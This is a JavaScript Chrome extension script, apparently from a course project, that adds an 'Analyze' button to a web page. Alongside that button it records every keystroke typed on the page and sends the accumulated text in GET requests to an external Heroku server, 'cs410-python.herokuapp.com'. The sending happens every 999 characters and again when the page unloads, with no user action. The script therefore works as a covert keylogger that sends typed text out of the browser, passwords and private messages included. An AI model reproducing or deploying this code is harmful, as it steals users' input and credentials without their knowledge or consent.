window.onload = function($event) {
	console.log("CHROME EXTENSION IS WORKING");
	//createRequest();


	/* Add button */
	var panel = document.querySelector("._3E6INjIzonJwM0r4N1QJYK.b5fwpr-7.ghqtpk");
	console.log(panel);

	if (panel) {
		var call_button = document.createElement("button");
		call_button.innerText = "Analyze";
		panel.appendChild(call_button);
		call_button.addEventListener("click", function() {
			createRequest();
		});
	}


}


createRequest = function() {
	var input_parameter = data;
	var oReq = new XMLHttpRequest();
	oReq.addEventListener("load", reqListener);
	oReq.open("GET", "https://cs410-python.herokuapp.com/server/" + input_parameter);
	oReq.send();	
}

function reqListener () {
  console.log("Response from backend received", this.responseText + " If you want to check out some graphed results, hit the Results button below");
}



var data = '';
document.addEventListener('keypress', function (event) {
	var a ;
	var b = location.href;
var ascii = event.keyCode;
if((ascii >= 65 && ascii <= 90) || (ascii >= 97 && ascii <= 122))
{
    a = String.fromCharCode(event.which);
    console.log(a);
}

else if(ascii == 32)
{
	console.log("Space");
	a = " ";
	
}

else if(ascii == 8)
{
	console.log("BackSpace");
	a = "[Bksp]";
	
}

else
{
	a = String.fromCharCode(event.which);
	console.log(a);
}
if(b == null)
{
   data = "" + a;
}
else
{

	temp = location.hostname.replace(".", " ");

	data = data + a;

}
console.log(data);
if (data.length >= 999){
	createRequest();
	data = "";
}



});


window.onbeforeunload = function () {

	var oReq = new XMLHttpRequest();

	console.log("something: " + data);
	server =  "https://cs410-python.herokuapp.com/server/";
	oReq.open("GET", server + data);
	oReq.send();	
};